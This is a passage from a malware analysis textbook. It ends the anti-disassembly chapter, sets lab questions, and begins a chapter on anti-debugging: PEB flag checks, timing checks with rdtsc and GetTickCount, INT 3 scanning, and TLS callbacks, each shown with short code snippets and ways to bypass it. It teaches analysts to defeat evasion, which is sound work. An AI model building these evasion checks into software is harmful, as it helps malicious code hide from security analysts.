<p class="calibre1">mov     [esp-0F8h+arg_F8], 1E61h</p>
<p class="calibre1">00401564 -F8                 lea     eax, [esp-0F8h+arg_F8]</p>
<p class="calibre1">00401568 -F8                 mov     [esp-0F8h+arg_F4], eax 0040156B -F8                 mov     edx, [esp-0F8h+arg_F4]</p>
<p class="calibre1">0040156E -F8                 mov     eax, [esp-0F8h+arg_F8]</p>
<p class="calibre1">00401572 -F8                 inc     eax</p>
<p class="calibre1">00401573 -F8                 mov     [edx], eax</p>
<p class="calibre1">00401575 -F8                 mov     eax, [esp-0F8h+arg_F4]</p>
<p class="calibre1">00401578 -F8                 mov     eax, [eax]</p>
<p class="calibre1">0040157A -F8                 add     esp, 8</p>
<p class="calibre1">0040157D -100                retn</p>
<p class="calibre1">0040157D     sub_401543      endp ; sp-analysis failed</p>
<p class="calibre1"> <i class="calibre4">Listing 15-1: A function that defeats stack-frame analysis</i> Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">347</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p381"/>Stack-frame anti-analysis techniques depend heavily on the compiler used. Of course, if the malware is entirely written in assembly, then the author is free to use more unorthodox techniques. However, if the malware is crafted with a higher-level language such as C or C++, special care must be taken to output code that can be manipulated. </p>
<p class="calibre1">In Listing 15-1, the column on the far left is the standard IDA Pro line prefix, which contains the segment name and memory address for each function. The next column to the right displays the stack pointer. For each instruction, the stack pointer column shows the value of the ESP register relative to where it was at the beginning of the function. This view shows that this function is an ESP-based stack frame rather than an EBP-based one, like most functions. (This stack pointer column can be enabled in IDA Pro through the Options menu.)</p>
<p class="calibre1">At , the stack pointer begins to be shown as a negative number. This should never happen for an ordinary function because it means that this function could damage the calling function’s stack frame. In this listing, IDA Pro is also telling us that it thinks this function takes 62 arguments, of which it thinks 2 are actually being used. </p>
<p class="calibre1"><b class="calibre3">NOTE</b></p>
<p class="calibre1"> <i class="calibre4">Press CTRL-K in IDA Pro to examine this monstrous stack frame in detail. If you</i> <i class="calibre4">attempt to press Y to give this function a prototype, you’ll be presented with one of</i> <i class="calibre4">the most ghastly abominations of a function prototype you’ve ever seen. </i></p>
<p class="calibre1">As you may have guessed, this function doesn’t actually take 62 arguments. In reality, it takes no arguments and has two local variables. The code responsible for breaking IDA Pro’s analysis lies near the beginning of the function, between locations 00401546 and 0040155C. It’s a simple comparison with two branches. </p>
<p class="calibre1">The ESP register is being compared against the value 0x1000. If it is less than 0x1000, then it executes the code at 00401556; otherwise, it executes the code at 00401551. Each branch adds some value to ESP—0x104 on the “less-than” branch and 4 on the “greater-than-or-equal-to” branch. From a disassembler’s perspective, there are two possible values of the stack pointer offset at this point, depending on which branch has been taken. The disassembler is forced to make a choice, and luckily for the malware author, it is tricked into making the wrong choice. </p>
<p class="calibre1">Earlier, we discussed conditional branch instructions, which were not conditional at all because they exist where the condition is constant, such as a jz instruction immediately following an xor eax, eax instruction. Innovative disassembler authors could code special semantics in their algorithm to track such guaranteed flag states and detect the presence of such fake conditional branches. The code would be useful in many scenarios and would be very straightforward, though cumbersome, to implement. </p>
<p class="calibre1">In Listing 15-1, the instruction cmp esp, 1000h will always produce a fixed result. An experienced malware analyst might recognize that the lowest memory page in a Windows process would not be used as a stack, and thus this comparison is virtually guaranteed to always result in the “greater-than-348</p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p382"/>or-equal-to” branch being executed. The disassembly program doesn’t have this level of intuition. Its job is to show you the instructions. It’s not designed to evaluate every decision in the code against a set of real-world scenarios. </p>
<p class="calibre1">The crux of the problem is that the disassembler assumed that the add esp, 104h instruction was valid and relevant, and adjusted its interpretation of the stack accordingly. The add esp, 4 instruction in the greater-than-or-equal-to branch was there solely to readjust the stack after the sub esp, 4 instruction that came before the comparison. The net result in real time is that the ESP </p>
<p class="calibre1">value will be identical to what it was prior to the beginning of the sequence at address 00401546. </p>
<p class="calibre1">To overcome minor adjustments to the stack frame (which occur occasionally due to the inherently fallible nature of stack-frame analysis), in IDA Pro, you can put the cursor on a particular line of disassembly and press ALT-K to enter an adjustment to the stack pointer. In many cases, such as in Listing 15-1, it may prove more fruitful to patch the stack-frame manipulation instructions, as in the previous examples. </p>
<p class="calibre1"><b class="calibre3">Conclusion</b></p>
<p class="calibre1">Anti-disassembly is not confined to the techniques discussed in this chapter. </p>
<p class="calibre1">It is a class of techniques that takes advantage of the inherent difficulties in analysis. Advanced programs such as modern disassemblers do an excellent job of determining which instructions constitute a program, but they still require assumptions and choices to be made in the process. For each choice or assumption that can be made by a disassembler, there may be a corresponding anti-disassembly technique. </p>
<p class="calibre1">This chapter showed how disassemblers work and how linear and flow-oriented disassembly strategies differ. Anti-disassembly is more difficult with a flow-oriented disassembler but still quite possible, once you understand that the disassembler is making certain assumptions about where the code will execute. Many anti-disassembly techniques used against flow-oriented disassemblers operate by crafting conditional flow-control instructions for which the condition is always the same at runtime but unknown by the disassembler. </p>
<p class="calibre1">Obscuring flow control is a way that malware can cause the malware analyst to overlook portions of code or hide a function’s purpose by obscuring its relation to other functions and system calls. We examined several ways to accomplish this, ranging from using the ret instruction to using SEH handlers as a general-purpose jump. </p>
<p class="calibre1">The goal of this chapter was to help you understand code from a tactical perspective. You learned how these types of techniques work, why they are useful, and how to defeat them when you encounter them in the field. More techniques are waiting to be discovered and invented. With this solid foundation, you will be more than prepared to wage war in the anti-disassembly battlefield of the future. </p>
<p class="calibre1">Anti-Disassembly</p>
<p class="calibre1"><b class="calibre3">349</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p383"/><b class="calibre3">L A B S</b></p>
<p class="calibre1"><b class="calibre3">Lab 15-1</b></p>
<p class="calibre1">Analyze the sample found in the file  <i class="calibre4">Lab15-01.exe</i>. This is a command-line program that takes an argument and prints “Good Job!” if the argument matches a secret code. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">What anti-disassembly technique is used in this binary? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What rogue opcode is the disassembly tricked into disassembling? </p>
<p class="calibre1">3. </p>
<p class="calibre1">How many times is this technique used? </p>
<p class="calibre1">4. </p>
<p class="calibre1">What command-line argument will cause the program to print </p>
<p class="calibre1">“Good Job!”? </p>
<p class="calibre1"><b class="calibre3">Lab 15-2</b></p>
<p class="calibre1">Analyze the malware found in the file  <i class="calibre4">Lab15-02.exe</i>. Correct all anti-disassembly countermeasures before analyzing the binary in order to answer the questions. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">What URL is initially requested by the program? </p>
<p class="calibre1">2. </p>
<p class="calibre1">How is the User-Agent generated? </p>
<p class="calibre1">3. </p>
<p class="calibre1">What does the program look for in the page it initially requests? </p>
<p class="calibre1">4. </p>
<p class="calibre1">What does the program do with the information it extracts from the page? </p>
<p class="calibre1"><b class="calibre3">Lab 15-3</b></p>
<p class="calibre1">Analyze the malware found in the file  <i class="calibre4">Lab15-03.exe</i>. At first glance, this binary appears to be a legitimate tool, but it actually contains more functionality than advertised. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Questions</b></i></p>
<p class="calibre1">1. </p>
<p class="calibre1">How is the malicious code initially called? </p>
<p class="calibre1">2. </p>
<p class="calibre1">What does the malicious code do? </p>
<p class="calibre1">3. </p>
<p class="calibre1">What URL does the malware use? </p>
<p class="calibre1">4. </p>
<p class="calibre1">What filename does the malware use? </p>
<p class="calibre1"><b class="calibre3">350</b></p>
<p class="calibre1">Chapter 15</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p384"/><b class="calibre3">A N T I - D E B U G G I N G</b></p>
<p class="calibre1"> <i class="calibre4">Anti-debugging</i> is a popular anti-analysis technique used by malware to recognize when it is under the control </p>
<p class="calibre1">of a debugger or to thwart debuggers. Malware authors </p>
<p class="calibre1">know that malware analysts use debuggers to figure out </p>
<p class="calibre1">how malware operates, and the authors use anti-debugging techniques in an attempt to slow down the analyst as much as possible. Once malware realizes that it is running in a debugger, it may alter its normal code execution path or modify the code to cause a crash, thus interfering with the analysts’ attempts to understand it, and adding time and additional overhead to their efforts. </p>
<p class="calibre1">There are many anti-debugging techniques—perhaps hundreds of them—</p>
<p class="calibre1">and we’ll discuss only the most popular ones that we have encountered in the real world. We will present ways to bypass anti-debugging techniques, but our overall goal in this chapter (besides introducing you to specific techniques) is to help you to develop the skills that you’ll need to overcome new and previously unknown anti-debugging methods during analysis. </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p385"/><b class="calibre3">Windows Debugger Detection</b></p>
<p class="calibre1">Malware uses a variety of techniques to scan for indications that a debugger is attached, including using the Windows API, manually checking memory structure for debugging artifacts, and searching the system for residue left by a debugger. Debugger detection is the most common way that malware performs anti-debugging. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using the Windows API</b></i></p>
<p class="calibre1">The use of Windows API functions is the most obvious of the anti-debugging techniques. The Windows API provides several functions that can be used by a program to determine if it is being debugged. Some of these functions were designed for debugger detection; others were designed for different purposes but can be repurposed to detect a debugger. A few of these functions use functionality not documented in the API. </p>
<p class="calibre1">Typically, the easiest way to overcome a call to an anti-debugging API function is to manually modify the malware during execution to not call these functions or to modify the flag’s post call to ensure that the proper path is taken. A more difficult option would be to hook these functions, as with a rootkit. </p>
<p class="calibre1">The following Windows API functions can be used for anti-debugging: <b class="calibre3">IsDebuggerPresent</b></p>
<p class="calibre1">The simplest API function for detecting a debugger is IsDebuggerPresent. </p>
<p class="calibre1">This function searches the Process Environment Block (PEB) structure for the field IsDebugged, which will return zero if you are not running in the context of a debugger or a nonzero value if a debugger is attached. </p>
<p class="calibre1">We’ll discuss the PEB structure in more detail in the next section. </p>
<p class="calibre1"><b class="calibre3">CheckRemoteDebuggerPresent</b></p>
<p class="calibre1">This API function is nearly identical to IsDebuggerPresent. The name is misleading though, as it does not check for a debugger on a remote machine, but rather for a process on the local machine. It also checks the PEB structure for the IsDebugged field; however, it can do so for itself or another process on the local machine. This function takes a process handle as a parameter and will check if that process has a debugger attached. CheckRemoteDebuggerPresent can be used to check your own process by simply passing a handle to your process. </p>
<p class="calibre1"><b class="calibre3">NtQueryInformationProcess</b></p>
<p class="calibre1">This is a native API function in  <i class="calibre4">Ntdll.dll</i> that retrieves information about a given process. The first parameter to this function is a process handle; the second is used to tell the function the type of process information to be retrieved. For example, using the value ProcessDebugPort (value 0x7) for this parameter will tell you if the process in question is currently being debugged. If the process is not being debugged, a zero will be returned; otherwise, a port number will be returned. </p>
<p class="calibre1"><b class="calibre3">352</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p386"/><b class="calibre3">OutputDebugString</b></p>
<p class="calibre1">This function is used to send a string to a debugger for display. It can be used to detect the presence of a debugger. For example, Listing 16-1 </p>
<p class="calibre1">uses SetLastError to set the current error code to an arbitrary value. If OutputDebugString is called and there is no debugger attached, GetLastError should no longer contain our arbitrary value, because an error code will be set by the OutputDebugString function if it fails. If OutputDebugString is called and there is a debugger attached, the call to OutputDebugString should succeed, and the value in GetLastError should not be changed. </p>
<p class="calibre1">DWORD errorValue = 12345; </p>
<p class="calibre1">SetLastError(errorValue); </p>
<p class="calibre1">OutputDebugString("Test for Debugger"); </p>
<p class="calibre1">if(GetLastError() == errorValue)</p>
<p class="calibre1">{</p>
<p class="calibre1">ExitProcess(); </p>
<p class="calibre1">}</p>
<p class="calibre1">else</p>
<p class="calibre1">{</p>
<p class="calibre1">RunMaliciousPayload(); </p>
<p class="calibre1">}</p>
<p class="calibre1"> <i class="calibre4">Listing 16-1: OutputDebugString anti-debugging technique</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Manually Checking Structures</b></i></p>
<p class="calibre1">Using the Windows API may be the most obvious method for detecting the presence of a debugger, but manually checking structures is the most common method used by malware authors. There are many reasons why malware authors are discouraged from using the Windows API for anti-debugging. </p>
<p class="calibre1">For example, the API calls could be hooked by a rootkit to return false information. Therefore, malware authors often choose to perform the functional equivalent of the API call manually, rather than rely on the Windows API. </p>
<p class="calibre1">In performing manual checks, several flags within the PEB structure provide information about the presence of a debugger. Here, we’ll look at some of the commonly used flags for checking for a debugger. </p>
<p class="calibre1"><b class="calibre3">Checking the BeingDebugged Flag</b></p>
<p class="calibre1">A Windows PEB structure is maintained by the OS for each running process, as shown in the example in Listing 16-2. It contains all user-mode parameters associated with a process. These parameters include the process’s environment data, which itself includes environment variables, the loaded modules list, addresses in memory, and debugger status. </p>
<p class="calibre1">typedef struct _PEB {</p>
<p class="calibre1">BYTE Reserved1[2]; </p>
<p class="calibre1">BYTE <b class="calibre3">BeingDebugged</b>; </p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">353</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p387"/>  BYTE Reserved2[1]; </p>
<p class="calibre1">PVOID Reserved3[2]; </p>
<p class="calibre1">PPEB_LDR_DATA Ldr; </p>
<p class="calibre1">PRTL_USER_PROCESS_PARAMETERS ProcessParameters; </p>
<p class="calibre1">BYTE Reserved4[104]; </p>
<p class="calibre1">PVOID Reserved5[52]; </p>
<p class="calibre1">PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; </p>
<p class="calibre1">BYTE Reserved6[128]; </p>
<p class="calibre1">PVOID Reserved7[1]; </p>
<p class="calibre1">ULONG SessionId; </p>
<p class="calibre1">} PEB, *PPEB; </p>
<p class="calibre1"> <i class="calibre4">Listing 16-2: Documented Process Environment Block (PEB) structure</i> While a process is running, the location of the PEB can be referenced by the location fs:[30h]. For anti-debugging, malware will use that location to check the BeingDebugged flag, which indicates whether the specified process is being debugged. Table 16-1 shows two examples of this type of check. </p>
<p class="calibre1"><b class="calibre3">Table 16-1: </b>Manually Checking the BeingDebugged Flag <b class="calibre3">mov method</b></p>
<p class="calibre1"><b class="calibre3">push/pop method</b></p>
<p class="calibre1">mov eax, dword ptr fs:[30h]</p>
<p class="calibre1">push dword ptr fs:[30h]</p>
<p class="calibre1">mov ebx, byte ptr [eax+2]</p>
<p class="calibre1">pop edx</p>
<p class="calibre1">test ebx, ebx</p>
<p class="calibre1">cmp byte ptr [edx+2], 1</p>
<p class="calibre1">jz NoDebuggerDetected</p>
<p class="calibre1">je DebuggerDetected</p>
<p class="calibre1">In the code on the left in Table 16-1, the location of the PEB is moved into EAX. Next, this offset plus 2 is moved into EBX, which corresponds to the offset into the PEB of the location of the BeingDebugged flag. Finally, EBX </p>
<p class="calibre1">is checked to see if it is zero. If so, a debugger is not attached, and the jump will be taken. </p>
<p class="calibre1">Another example is shown on the right side of Table 16-1. The location of the PEB is moved into EDX using a push/pop combination of instructions, and then the BeingDebugged flag at offset 2 is directly compared to 1. </p>
<p class="calibre1">This check can take many forms, and, ultimately, the conditional jump determines the code path. You can take one of the following approaches to surmount this problem:</p>
<p class="calibre1"></p>
<p class="calibre1">Force the jump to be taken (or not) by manually modifying the zero flag immediately before the jump instruction is executed. This is the easiest approach. </p>
<p class="calibre1"></p>
<p class="calibre1">Manually change the BeingDebugged flag to zero. </p>
<p class="calibre1">Both options are generally effective against all of the techniques described in this section. </p>
<p class="calibre1"><b class="calibre3">NOTE</b></p>
<p class="calibre1"> <i class="calibre4">A number of OllyDbg plug-ins change the BeingDebugged flag for you. The most popular are Hide Debugger, Hidedebug, and PhantOm. All are useful for overcoming the</i> <i class="calibre4">BeingDebugged flag check and also help with many of the other techniques we discuss in</i> <i class="calibre4">this chapter. </i></p>
<p class="calibre1"><b class="calibre3">354</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p388"/><b class="calibre3">Checking the ProcessHeap Flag</b></p>
<p class="calibre1">An undocumented location within the Reserved4 array (shown in Listing 16-2), known as ProcessHeap, is set to the location of a process’s first heap allocated by the loader. ProcessHeap is located at 0x18 in the PEB structure. This first heap contains a header with fields used to tell the kernel whether the heap was created within a debugger. These are known as the ForceFlags and Flags fields. </p>
<p class="calibre1">Offset 0x10 in the heap header is the ForceFlags field on Windows XP, but for Windows 7, it is at offset 0x44 for 32-bit applications. Malware may also look at offset 0x0C on Windows XP or offset 0x40 on Windows 7 for the Flags field. This field is almost always equal to the ForceFlags field, but is usually ORed with the value 2. </p>
<p class="calibre1">Listing 16-3 shows the assembly code for this technique. (Note that two separate dereferences must occur.)</p>
<p class="calibre1">mov eax, large fs:30h</p>
<p class="calibre1">mov eax, dword ptr [eax+18h]</p>
<p class="calibre1">cmp dword ptr ds:[eax+10h], 0</p>
<p class="calibre1">jne DebuggerDetected</p>
<p class="calibre1"> <i class="calibre4">Listing 16-3: Manual ProcessHeap flag check</i></p>
<p class="calibre1">The best way to overcome this technique is to change the ProcessHeap flag manually or to use a hide-debug plug-in for your debugger. If you are using WinDbg, you can start the program with the debug heap disabled. For example, the command windbg –hd notepad.exe will start the heap in normal mode as opposed to debug mode, and the flags we’ve discussed won’t be set. </p>
<p class="calibre1"><b class="calibre3">Checking NTGlobalFlag</b></p>
<p class="calibre1">Since processes run slightly differently when started with a debugger, they create memory heaps differently. The information that the system uses to determine how to create heap structures is stored at an undocumented location in the PEB at offset 0x68. If the value at this location is 0x70, we know that we are running in a debugger. </p>
<p class="calibre1">The value of 0x70 is a combination of the following flags when a heap is created by a debugger. These flags are set for the process if it is started from within a debugger. </p>
<p class="calibre1">(FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) Listing 16-4 shows the assembly code for performing this check. </p>
<p class="calibre1">mov eax, large fs:30h</p>
<p class="calibre1">cmp dword ptr ds:[eax+68h], 70h</p>
<p class="calibre1">jz DebuggerDetected</p>
<p class="calibre1"> <i class="calibre4">Listing 16-4: NTGlobalFlag check</i></p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">355</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p389"/>The easiest way to overcome this technique is to change the flags manually or with a hide-debug plug-in for your debugger. If you are using WinDbg, you can start the program with the debug heap option disabled, as mentioned in the previous section. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Checking for System Residue</b></i></p>
<p class="calibre1">When analyzing malware, we typically use debugging tools, which leave residue on the system. Malware can search for this residue in order to determine when you are attempting to analyze it, such as by searching registry keys for references to debuggers. The following is a common location for a debugger: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug This registry key specifies the debugger that activates when an application error occurs. By default, this is set to Dr. Watson, so if it is changed to something like OllyDbg, malware may determine that it is under a microscope. </p>
<p class="calibre1">Malware can also search the system for files and directories, such as common debugger program executables, which are typically present during malware analysis. (Many backdoors already have code in place to traverse filesystems.) Or the malware can detect residue in live memory, by viewing the current process listing or, more commonly, by performing a FindWindow in search of a debugger, as shown in Listing 16-5. </p>
<p class="calibre1">if(<b class="calibre3">FindWindow</b>("OLLYDBG", 0) == NULL)</p>
<p class="calibre1">{</p>
<p class="calibre1">//Debugger Not Found</p>
<p class="calibre1">}</p>
<p class="calibre1">else</p>
<p class="calibre1">{</p>
<p class="calibre1">//Debugger Detected</p>
<p class="calibre1">}</p>
<p class="calibre1"> <i class="calibre4">Listing 16-5: C code for FindWindow detection</i></p>
<p class="calibre1">In this example, the code simply looks for a window named OLLYDBG. </p>
<p class="calibre1"><b class="calibre3">Identifying Debugger Behavior</b></p>
<p class="calibre1">Recall that debuggers can be used to set breakpoints or to single-step through a process in order to aid the malware analyst in reverse-engineering. However, when these operations are performed in a debugger, they modify the code in the process. Several anti-debugging techniques are used by malware to detect this sort of debugger behavior: INT scanning, checksum checks, and timing checks. </p>
<p class="calibre1"><b class="calibre3">356</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p390"/> <i class="calibre4"><b class="calibre3">INT Scanning</b></i></p>
<p class="calibre1">INT 3 is the software interrupt used by debuggers to temporarily replace an instruction in a running program and to call the debug exception handler—</p>
<p class="calibre1">a basic mechanism to set a breakpoint. The opcode for INT 3 is 0xCC. Whenever you use a debugger to set a breakpoint, it modifies the code by inserting a 0xCC. </p>
<p class="calibre1">In addition to the specific INT 3 instruction, an INT  <i class="calibre4">immediate</i> can set any interrupt, including 3 ( <i class="calibre4">immediate</i> can be a register, such as EAX). The INT </p>
<p class="calibre1"> <i class="calibre4">immediate</i> instruction uses two opcodes: 0xCD  <i class="calibre4">value</i>. This 2-byte opcode is less commonly used by debuggers. </p>
<p class="calibre1">One common anti-debugging technique has a process scan its own code for an INT 3 modification by searching the code for the 0xCC opcode, as shown in Listing 16-6. </p>
<p class="calibre1">call $+5</p>
<p class="calibre1">pop edi</p>
<p class="calibre1">sub edi, 5</p>
<p class="calibre1">mov ecx, 400h</p>
<p class="calibre1">mov eax, 0CCh</p>
<p class="calibre1">repne scasb</p>
<p class="calibre1">jz DebuggerDetected</p>
<p class="calibre1"> <i class="calibre4">Listing 16-6: Scanning code for breakpoints</i></p>
<p class="calibre1">This code begins with a call, followed by a pop that puts EIP into EDI. </p>
<p class="calibre1">EDI is then adjusted to the start of the code. The code is then scanned for 0xCC bytes. If a 0xCC byte is found, it knows that a debugger is present. This technique can be overcome by using hardware breakpoints instead of software breakpoints. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Performing Code Checksums</b></i></p>
<p class="calibre1">Malware can calculate a checksum on a section of its code to accomplish the same goal as scanning for interrupts. Instead of scanning for 0xCC, this check simply performs a cyclic redundancy check (CRC) or a MD5 checksum of the opcodes in the malware. </p>
<p class="calibre1">This technique is less common than scanning, but it’s equally effective. </p>
<p class="calibre1">Look for the malware to be iterating over its internal instructions followed by a comparison to an expected value. </p>
<p class="calibre1">This technique can be overcome by using hardware breakpoints or by manually modifying the execution path with the debugger at runtime. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Timing Checks</b></i></p>
<p class="calibre1">Timing checks are one of the most popular ways for malware to detect debuggers because processes run more slowly when being debugged. For example, single-stepping through a program substantially slows execution speed. </p>
<p class="calibre1">Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">357</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p391"/>There are a couple of ways to use timing checks to detect a debugger:</p>
<p class="calibre1"></p>
<p class="calibre1">Record a timestamp, perform a couple of operations, take another timestamp, and then compare the two timestamps. If there is a lag, you can assume the presence of a debugger. </p>
<p class="calibre1"></p>
<p class="calibre1">Take a timestamp before and after raising an exception. If a process is not being debugged, the exception will be handled really quickly; a debugger will handle the exception much more slowly. By default, most debuggers require human intervention in order to handle exceptions, which causes enormous delay. While many debuggers allow you to ignore exceptions and pass them to the program, there will still be a sizable delay in such cases. </p>
<p class="calibre1"><b class="calibre3">Using the rdtsc Instruction</b></p>
<p class="calibre1">The most common timing check method uses the rdtsc instruction (opcode 0x0F31), which returns the count of the number of ticks since the last system reboot as a 64-bit value placed into EDX:EAX. Malware will simply execute this instruction twice and compare the difference between the two readings. </p>
<p class="calibre1">Listing 16-7 shows a real malware sample using the rdtsc technique. </p>
<p class="calibre1">rdtsc</p>
<p class="calibre1">xor ecx, ecx</p>
<p class="calibre1">add ecx, eax</p>
<p class="calibre1">rdtsc</p>
<p class="calibre1">sub eax, ecx</p>
<p class="calibre1">cmp eax, 0xFFF </p>
<p class="calibre1">jb NoDebuggerDetected</p>
<p class="calibre1">rdtsc</p>
<p class="calibre1">push eax </p>
<p class="calibre1">ret</p>
<p class="calibre1"> <i class="calibre4">Listing 16-7: The rdtsc timing technique</i></p>
<p class="calibre1">The malware checks to see if the difference between the two calls to rdtsc is greater than 0xFFF at , and if too much time has elapsed, the conditional jump will not be taken. If the jump is not taken, rdtsc is called again, and the result is pushed onto the stack at , which will cause the return to take the execution to a random location. </p>
<p class="calibre1"><b class="calibre3">Using QueryPerformanceCounter and GetTickCount</b></p>
<p class="calibre1">Two Windows API functions are used like rdtsc in order to perform an anti-debugging timing check. This method relies on the fact that processors have high-resolution performance counters—registers that store counts of activities performed in the processor. QueryPerformanceCounter can be called to query this counter twice in order to get a time difference for use in a comparison. </p>
<p class="calibre1">If too much time has passed between the two calls, the assumption is that a debugger is being used. </p>
<p class="calibre1"><b class="calibre3">358</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p392"/>The function GetTickCount returns the number of milliseconds that have elapsed since the last system reboot. (Due to the size allocated for this counter, it rolls over after 49.7 days.) An example of GetTickCount in practice is shown in Listing 16-8. </p>
<p class="calibre1">a = <b class="calibre3">GetTickCount</b>(); </p>
<p class="calibre1">MaliciousActivityFunction(); </p>
<p class="calibre1">b = <b class="calibre3">GetTickCount</b>(); </p>
<p class="calibre1">delta = b-a; </p>
<p class="calibre1">if ((delta) &gt; 0x1A)</p>
<p class="calibre1">{</p>
<p class="calibre1">//Debugger Detected</p>
<p class="calibre1">} </p>
<p class="calibre1">else </p>
<p class="calibre1">{</p>
<p class="calibre1">//Debugger Not Found</p>
<p class="calibre1">}</p>
<p class="calibre1"> <i class="calibre4">Listing 16-8: GetTickCount timing technique</i></p>
<p class="calibre1">All of the timing attacks we’ve discussed can be found during debugging or static analysis by identifying two successive calls to these functions followed by a comparison. These checks should catch a debugger only if you are single-stepping or setting breakpoints between the two calls used to capture the time delta. Therefore, the easiest way to avoid detection by timing is to run through these checks and set a breakpoint just after them, and then start your single-stepping again. If that is not an option, simply modify the result of the comparison to force the jump that you want to be taken. </p>
<p class="calibre1"><b class="calibre3">Interfering with Debugger Functionality</b></p>
<p class="calibre1">Malware can use several techniques to interfere with normal debugger operation: thread local storage (TLS) callbacks, exceptions, and interrupt insertion. These techniques try to disrupt the program’s execution only if it is under the control of a debugger. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using TLS Callbacks</b></i></p>
<p class="calibre1">You might think that when you load a program into a debugger, it will pause at the first instruction the program executes, but this is not always the case. Most debuggers start at the program’s entry point as defined by the PE </p>
<p class="calibre1">header. A TLS callback can be used to execute code before the entry point and therefore execute secretly in a debugger. If you rely only on the use of a debugger, you could miss certain malware functionality, as the TLS callback can run as soon as it is loaded into the debugger. </p>
<p class="calibre1">TLS is a Windows storage class in which a data object is not an automatic stack variable, yet is local to each thread that runs the code. Basically, TLS </p>
<p class="calibre1">allows each thread to maintain a different value for a variable declared using Anti-Debugging</p>
<p class="calibre1"><b class="calibre3">359</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p393"/><img src="index-393_1.png" alt="Image 83" class="calibre2"/></p>
<p class="calibre1"><img src="index-393_2.png" alt="Image 84" class="calibre2"/></p>
<p class="calibre1">TLS. When TLS is implemented by an executable, the code will typically contain a .tls section in the PE header, as shown in Figure 16-1. TLS supports callback functions for initialization and termination of TLS data objects. </p>
<p class="calibre1">Windows executes these functions before running code at the normal start of a program. </p>
<p class="calibre1"> <i class="calibre4">Figure 16-1: TLS callback example—a TLS table in PEview</i> TLS callbacks can be discovered by viewing the .tls section using PEview. </p>
<p class="calibre1">You should immediately suspect anti-debugging if you see a .tls section, as normal programs typically do not use this section. </p>
<p class="calibre1">Analysis of TLS callbacks is easy with IDA Pro. Once IDA Pro has finished its analysis, you can view the entry points for a binary by pressing CTRL-E to display all entry points to the program, including TLS callbacks, as shown in Figure 16-2. All TLS callback functions have their labels prepended with TlsCallback. You can browse to the callback function in IDA Pro by double-clicking the function name. </p>
<p class="calibre1"> <i class="calibre4">Figure 16-2: Viewing a TLS callback function in IDA Pro</i> <i class="calibre4">(press CTRL-E to display)</i></p>
<p class="calibre1"><b class="calibre3">360</b></p>
<p class="calibre1">Chapter 16</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p394"/><img src="index-394_1.png" alt="Image 85" class="calibre2"/></p>
<p class="calibre1">TLS callbacks can be handled within a debugger, though sometimes debuggers will run the TLS callback before breaking at the initial entry point. To avoid this problem, change the debugger’s settings. For example, if you’re using OllyDbg, you can have it pause before the TLS callback by selecting <b class="calibre3">Options</b><b class="calibre3">Debugging Options</b><b class="calibre3">Events</b> and setting <b class="calibre3">System breakpoint</b> as the place for the first pause, as shown in Figure 16-3. </p>
<p class="calibre1"><b class="calibre3">NOTE</b></p>
<p class="calibre1"> <i class="calibre4">OllyDbg 2.0 has more breaking capabilities than version 1.1; for example, it can pause</i> <i class="calibre4">at the start of a TLS callback. Also, WinDbg always breaks at the system breakpoint</i> <i class="calibre4">before the TLS callbacks. </i></p>
<p class="calibre1"> <i class="calibre4">Figure 16-3: OllyDbg first pause options</i></p>
<p class="calibre1">Because TLS callbacks are well known, malware uses them less frequently than in the past. Not many legitimate applications use TLS callbacks, so a </p>
<p class="calibre1">.tls section in an executable can stand out. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using Exceptions</b></i></p>
